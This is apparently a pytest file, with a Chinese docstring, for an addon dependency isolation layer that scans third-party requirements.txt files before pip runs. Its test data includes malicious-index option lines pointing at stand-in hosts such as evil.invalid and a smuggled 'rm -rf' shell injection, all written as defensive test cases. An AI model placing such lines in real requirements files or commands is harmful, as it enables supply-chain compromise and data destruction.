"""第三方 addon 的依赖，装进它自己的 venv，不装进你的 Python 环境。

## 改之前是什么样

`core/github_installer.py` 的模块 docstring 写着
「Install Python dependencies into a per-addon venv (optional)」，
而 `_install_deps` 自己的注释写着
「Uses the current Python environment (… a venv per addon would be safer but heavier)」。

**两句话在同一个文件里打架，实际行为是后者**：`github__install` 装一个第三方仓库，
它 manifest 里的依赖会 `pip install` 进宿主的 Python 环境。而 `github__install`
是 LLM 直接可调的工具，默认 allowlist 为空（全放行）。

## 还有一个更具体的洞：`-r requirements.txt` 绕过了旁边那一整套净化

`_install_deps` 对 `deps` 逐项做了很细的净化——拒绝 `-` 开头的条目（注释里明写
「`--index-url=恶意源` → 供应链注入」）、拒绝路径穿越、拒绝 shell 元字符。
然后把第三方的 `requirements.txt` 原样 `-r` 交给 pip。

而 requirements 文件里**可以写那些选项**。实测（不是查文档）：

    $ cat requirements.txt
    --index-url https://example-evil.invalid/simple
    requests
    $ pip install --dry-run -r requirements.txt
    Looking in indexes: https://example-evil.invalid/simple     ← pip 认了

前面那扇门挡住的东西，从这扇门原样进来。

## 这一层解决什么、不解决什么

解决的是**依赖被装进宿主环境**。
**不**解决「第三方代码跑在隔离边界里」——Skill 是 `exec_module` 进本进程的
（`core/skill_loader.py`），venv 对它的*执行*没有任何约束力。那是
`core/execution_isolation.py` 那条线的问题，不在这一层。这个区分必须说清楚，
否则「装了 venv」会被当成「已经沙箱化了」。
"""

import subprocess
import sys
from pathlib import Path

import pytest

from core.addon_dependency_isolation import (
    add_venv_to_sys_path,
    ensure_venv,
    install_addon_deps,
    scan_requirements_file,
    venv_python,
    venv_site_packages,
)
from core.github_installer import _build_mcp_command


class TestRequirementsAreScannedBeforePip:
    @pytest.mark.parametrize(
        "line",
        [
            "--index-url https://evil.invalid/simple",
            "--extra-index-url https://evil.invalid/simple",
            "-i https://evil.invalid/simple",
            "--find-links https://evil.invalid/",
            "-e .",
            "-r other-requirements.txt",
            "--trusted-host evil.invalid",
        ],
    )
    def test_option_lines_are_rejected(self, tmp_path, line):
        """这些都是 pip **选项**，不是包名。逐项净化早就在防它们，只是 -r 绕过去了。"""
        req = tmp_path / "requirements.txt"
        req.write_text(f"requests\n{line}\nnumpy\n", encoding="utf-8")
        violations = scan_requirements_file(req)
        assert violations, f"没拦住: {line!r}"
        assert line.split()[0] in violations[0] or line in violations[0]

    def test_a_clean_file_passes(self, tmp_path):
        """差分的另一半：只验「脏的被拒」的话，把所有文件都拒掉也能全绿。"""
        req = tmp_path / "requirements.txt"
        req.write_text(
            "# 一行注释\n\nrequests>=2.31\nnumpy==1.26.0  # 行尾注释\npydantic[email]<3\n",
            encoding="utf-8",
        )
        assert scan_requirements_file(req) == []

    def test_shell_metacharacters_are_rejected(self, tmp_path):
        req = tmp_path / "requirements.txt"
        req.write_text("requests; rm -rf /tmp/x\n", encoding="utf-8")
        assert scan_requirements_file(req)

    def test_a_dirty_file_is_refused_whole_not_filtered(self, tmp_path):
        """整份拒绝，不是挑掉几行再装。

        删掉几行再装，得到的是一套**谁都没验证过**的依赖组合——装成功了更糟，
        因为没人会发现少了什么。
        """
        req = tmp_path / "requirements.txt"
        req.write_text("--index-url https://evil.invalid/simple\nrequests\n", encoding="utf-8")
        result = install_addon_deps(tmp_path, [])
        assert result["success"] is False
        assert result["scope"] == "rejected"
        assert result["violations"], "拒了却不说是哪一行，等于只说了『不行』"

    def test_pip_is_never_invoked_for_a_dirty_file(self, tmp_path, monkeypatch):
        """判据盯着**pip 一次都没被调用**，而不只是返回值是 False。

        只看返回值的话，「先跑 pip、失败了再返回 False」也会通过——而那时恶意 index
        已经被访问过了。

        这条第一版是在桩里 `raise AssertionError`，**不成立**：`_ensure_venv` 外面裹着
        `except Exception`，把断言异常一起吞了，于是变异（把扫描去掉）跑出来它照样绿。
        改成**记账再断言**——记录不会被任何 except 吃掉。
        """
        req = tmp_path / "requirements.txt"
        req.write_text("--index-url https://evil.invalid/simple\n", encoding="utf-8")

        calls: list = []
        monkeypatch.setattr(subprocess, "run", lambda cmd, **kw: calls.append(cmd))

        assert install_addon_deps(tmp_path, [])["success"] is False
        assert calls == [], f"脏的 requirements.txt 竟然走到了 subprocess: {calls}"


class TestItFailsClosedWhenTheVenvCannotBeBuilt:
    def test_no_venv_and_no_opt_in_means_no_install(self, tmp_path, monkeypatch):
        """建不出 venv 就退回宿主环境，等于这层没装，而且失败得悄无声息。"""
        monkeypatch.delenv("GALAXY_ADDON_HOST_DEPS", raising=False)
        monkeypatch.setattr("core.addon_dependency_isolation.ensure_venv", lambda d: None)
        result = install_addon_deps(tmp_path, ["requests"])
        assert result["success"] is False
        assert result["scope"] == "venv_unavailable"
        assert "GALAXY_ADDON_HOST_DEPS" in result["error"], "要告诉人怎么显式接受这个代价"

    def test_the_host_escape_hatch_is_opt_in_only(self, tmp_path, monkeypatch):
        """口子留着，但必须是一次**显式**选择，并且结果里 scope 如实写 host。"""
        monkeypatch.setenv("GALAXY_ADDON_HOST_DEPS", "1")
        monkeypatch.setattr("core.addon_dependency_isolation.ensure_venv", lambda d: None)
        calls = []

        class _Ok:
            returncode = 0
            stderr = ""

        monkeypatch.setattr(subprocess, "run", lambda cmd, **kw: (calls.append(cmd), _Ok())[1])
        result = install_addon_deps(tmp_path, ["requests"])
        assert result["success"] is True
        assert result["scope"] == "host", "装进宿主却不说，就是这次要改掉的那个形状"
        assert calls and calls[0][0] == sys.executable


class TestTheVenvIsActuallyUsed:
    """建了 venv 却仍拿宿主解释器起进程，那个 venv 就是摆设。"""

    def test_mcp_command_falls_back_to_the_host_python_when_there_is_no_venv(self, tmp_path):
        (tmp_path / "server.py").write_text("", encoding="utf-8")
        assert _build_mcp_command(tmp_path, "server.py")[0] == sys.executable

    def test_mcp_command_switches_to_the_venv_python_once_it_exists(self, tmp_path, monkeypatch):
        fake = tmp_path / ".galaxy-venv" / "bin" / "python"
        fake.parent.mkdir(parents=True)
        fake.write_text("", encoding="utf-8")
        (tmp_path / "server.py").write_text("", encoding="utf-8")
        assert _build_mcp_command(tmp_path, "server.py")[0] == str(fake)

    def test_a_non_python_entrypoint_is_untouched(self, tmp_path):
        """venv 只管 Python 入口。node 入口不该被换成 venv 里的 python。"""
        (tmp_path / "server.js").write_text("", encoding="utf-8")
        assert _build_mcp_command(tmp_path, "server.js")[0].endswith("node")


class TestSkillsGetTheirDepsWithoutPollutingTheHost:
    """Skill 是 exec_module 进本进程的，换解释器这条路不存在——只能靠 sys.path。"""

    def test_site_packages_is_appended_not_prepended(self, tmp_path, monkeypatch):
        site = tmp_path / ".galaxy-venv" / "lib" / "python3.11" / "site-packages"
        site.mkdir(parents=True)
        monkeypatch.setattr(sys, "path", list(sys.path))
        before = list(sys.path)
        assert add_venv_to_sys_path(tmp_path) is True
        assert sys.path[-1] == str(site), "要追加到最后：插到最前会让 addon 的包盖掉整个进程的同名包"
        assert sys.path[:-1] == before

    def test_adding_twice_does_not_duplicate(self, tmp_path, monkeypatch):
        site = tmp_path / ".galaxy-venv" / "lib" / "python3.11" / "site-packages"
        site.mkdir(parents=True)
        monkeypatch.setattr(sys, "path", list(sys.path))
        add_venv_to_sys_path(tmp_path)
        add_venv_to_sys_path(tmp_path)
        assert sys.path.count(str(site)) == 1

    def test_no_venv_means_no_path_change(self, tmp_path, monkeypatch):
        monkeypatch.setattr(sys, "path", list(sys.path))
        before = list(sys.path)
        assert add_venv_to_sys_path(tmp_path) is False
        assert sys.path == before


class TestARealVenvIsCreated:
    """真建一个 venv。不联网（stdlib venv），但它是上面那些桩的前提是否成立的唯一证据。"""

    def test_ensure_venv_produces_a_working_interpreter(self, tmp_path):
        python_exe = ensure_venv(tmp_path)
        if python_exe is None:
            pytest.skip("本机 python -m venv 不可用")
        assert python_exe == venv_python(tmp_path)
        assert venv_site_packages(tmp_path) is not None
        probe = subprocess.run(
            [str(python_exe), "-c", "import sys; print(sys.prefix)"],
            capture_output=True,
            text=True,
            timeout=60,
        )
        assert probe.returncode == 0, probe.stderr
        assert str(tmp_path) in probe.stdout, "解释器没跑在这个 addon 的 venv 里"

    def test_it_is_idempotent(self, tmp_path):
        first = ensure_venv(tmp_path)
        if first is None:
            pytest.skip("本机 python -m venv 不可用")
        assert ensure_venv(tmp_path) == first

    def test_system_site_packages_is_on(self, tmp_path):
        """宿主已装的包照样 import 得到——否则每个 addon 都要重装整棵依赖树，
        慢到没人会用，而没人用的隔离等于没有隔离。"""
        python_exe = ensure_venv(tmp_path)
        if python_exe is None:
            pytest.skip("本机 python -m venv 不可用")
        cfg = (Path(python_exe).parent.parent / "pyvenv.cfg").read_text(encoding="utf-8")
        assert "include-system-site-packages = true" in cfg
